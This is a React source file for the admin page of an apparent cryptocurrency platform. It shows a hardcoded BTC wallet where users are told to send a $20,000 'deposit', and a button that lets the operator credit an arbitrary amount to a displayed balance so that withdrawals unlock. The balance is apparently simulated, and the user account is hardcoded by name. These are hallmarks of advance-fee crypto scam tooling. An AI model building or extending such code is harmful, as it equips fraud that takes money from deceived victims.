import { useEffect, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { useAuth } from '@/contexts/AuthContext';
import { useWallet } from '@/contexts/WalletContext';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Shield, DollarSign, Check, LogOut, Copy, Wallet } from 'lucide-react';
import { toast } from '@/hooks/use-toast';
import { motion } from 'framer-motion';

const BTC_WALLET_ADDRESS = 'bc1qfxcpxs5ztaf0ru6ptgk5hs7wcqq6khddy3g99e';

const Admin = () => {
  const { user, isAdmin, logout } = useAuth();
  const { addDeposit, totalBalance, hasDeposited } = useWallet();
  const navigate = useNavigate();
  const [depositAmount, setDepositAmount] = useState('20000');
  const [isConfirming, setIsConfirming] = useState(false);

  useEffect(() => {
    if (!user || !isAdmin) {
      navigate('/');
    }
  }, [user, isAdmin, navigate]);

  const handleConfirmDeposit = async () => {
    const amount = parseFloat(depositAmount);
    if (isNaN(amount) || amount <= 0) {
      toast({
        title: "Invalid amount",
        description: "Please enter a valid deposit amount",
        variant: "destructive",
      });
      return;
    }

    setIsConfirming(true);
    await new Promise(resolve => setTimeout(resolve, 1000));
    
    addDeposit(amount);
    
    toast({
      title: "Deposit Confirmed",
      description: `$${amount.toLocaleString()} has been added to the user's wallet`,
    });
    
    setIsConfirming(false);
    setDepositAmount('20000');
  };

  const handleLogout = () => {
    logout();
    navigate('/');
  };

  const copyWalletAddress = () => {
    navigator.clipboard.writeText(BTC_WALLET_ADDRESS);
    toast({
      title: "Copied",
      description: "Wallet address copied to clipboard",
    });
  };

  if (!isAdmin) return null;

  return (
    <div className="min-h-screen bg-background p-4 md:p-8">
      <div className="max-w-4xl mx-auto space-y-6">
        {/* Header */}
        <motion.div 
          className="flex items-center justify-between"
          initial={{ opacity: 0, y: -20 }}
          animate={{ opacity: 1, y: 0 }}
        >
          <div className="flex items-center gap-3">
            <div className="w-12 h-12 rounded-xl bg-gradient-to-br from-primary to-warning flex items-center justify-center">
              <Shield className="w-6 h-6 text-primary-foreground" />
            </div>
            <div>
              <h1 className="text-2xl font-bold">Admin Panel</h1>
              <p className="text-sm text-muted-foreground">Deposit Confirmation System</p>
            </div>
          </div>
          <Button variant="outline" onClick={handleLogout}>
            <LogOut className="w-4 h-4 mr-2" />
            Logout
          </Button>
        </motion.div>

        {/* Stats */}
        <motion.div 
          className="grid grid-cols-1 md:grid-cols-3 gap-4"
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.1 }}
        >
          <Card className="glass-card">
            <CardHeader className="pb-2">
              <CardDescription>User Total Balance</CardDescription>
            </CardHeader>
            <CardContent>
              <p className="text-2xl font-bold text-gradient">
                ${totalBalance.toLocaleString()}
              </p>
            </CardContent>
          </Card>
          
          <Card className="glass-card">
            <CardHeader className="pb-2">
              <CardDescription>Deposit Status</CardDescription>
            </CardHeader>
            <CardContent>
              <p className={`text-2xl font-bold ${hasDeposited ? 'text-success' : 'text-warning'}`}>
                {hasDeposited ? 'Completed' : 'Pending'}
              </p>
            </CardContent>
          </Card>
          
          <Card className="glass-card">
            <CardHeader className="pb-2">
              <CardDescription>User Account</CardDescription>
            </CardHeader>
            <CardContent>
              <p className="text-2xl font-bold">Bryanvoth 105</p>
            </CardContent>
          </Card>
        </motion.div>

        {/* BTC Wallet Info */}
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.2 }}
        >
          <Card className="glass-card border-primary/20">
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <Wallet className="w-5 h-5 text-primary" />
                Deposit BTC Wallet
              </CardTitle>
              <CardDescription>
                This is the wallet address where users send their $20,000 deposit
              </CardDescription>
            </CardHeader>
            <CardContent>
              <div className="flex items-center gap-2 p-3 bg-secondary/50 rounded-lg">
                <code className="text-sm flex-1 break-all text-primary">
                  {BTC_WALLET_ADDRESS}
                </code>
                <Button variant="ghost" size="sm" onClick={copyWalletAddress}>
                  <Copy className="w-4 h-4" />
                </Button>
              </div>
            </CardContent>
          </Card>
        </motion.div>

        {/* Confirm Deposit */}
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.3 }}
        >
          <Card className="glass-card border-success/20">
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <DollarSign className="w-5 h-5 text-success" />
                Confirm User Deposit
              </CardTitle>
              <CardDescription>
                Once you verify the $20,000 BTC deposit has been received, confirm it here to add funds to the user's wallet and unlock withdrawals
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="space-y-2">
                <label className="text-sm font-medium">Deposit Amount (USD)</label>
                <Input
                  type="number"
                  value={depositAmount}
                  onChange={(e) => setDepositAmount(e.target.value)}
                  placeholder="Enter deposit amount"
                  className="text-lg"
                />
              </div>
              
              <Button 
                variant="gold" 
                size="lg" 
                className="w-full"
                onClick={handleConfirmDeposit}
                disabled={isConfirming}
              >
                {isConfirming ? (
                  <motion.div 
                    className="w-5 h-5 border-2 border-primary-foreground/30 border-t-primary-foreground rounded-full"
                    animate={{ rotate: 360 }}
                    transition={{ duration: 1, repeat: Infinity, ease: 'linear' }}
                  />
                ) : (
                  <>
                    <Check className="w-5 h-5 mr-2" />
                    Confirm Deposit Received
                  </>
                )}
              </Button>

              {hasDeposited && (
                <motion.div 
                  className="p-3 bg-success/10 border border-success/20 rounded-lg text-center"
                  initial={{ opacity: 0, scale: 0.95 }}
                  animate={{ opacity: 1, scale: 1 }}
                >
                  <p className="text-success font-medium">
                    ✓ Deposit has been confirmed. User can now request withdrawals.
                  </p>
                </motion.div>
              )}
            </CardContent>
          </Card>
        </motion.div>
      </div>
    </div>
  );
};

export default Admin;
